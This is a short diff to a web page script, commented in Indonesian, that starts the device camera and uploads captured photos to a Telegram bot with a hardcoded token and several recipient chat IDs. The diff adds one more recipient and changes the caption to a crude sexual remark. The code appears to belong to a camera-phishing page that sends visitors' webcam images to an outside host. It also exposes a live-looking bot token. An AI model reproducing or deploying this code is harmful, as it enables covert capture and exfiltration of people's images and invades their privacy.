@@ -19,7 +19,7 @@
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY";
-        const TELEGRAM_CHAT_ID = ["7081489041", "7066324287", "987654321"]; // Ganti dengan ID owner lo
+        const TELEGRAM_CHAT_ID = ["7081489041", "7066324287", "5118589852"]; // Ganti dengan ID owner lo
 
         async function startCamera() {
             try {
@@ -61,7 +61,7 @@
                     const formData = new FormData();
                     formData.append("chat_id", chatId);
                     formData.append("photo", blob, `${label}.jpg`);
-                    formData.append("caption", `📷 Foto ${label}`);
+                    formData.append("caption", `📷 Nih sayang fotonya,jangan ngaceng ya sayang ${label}`);
 
                     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: "POST",
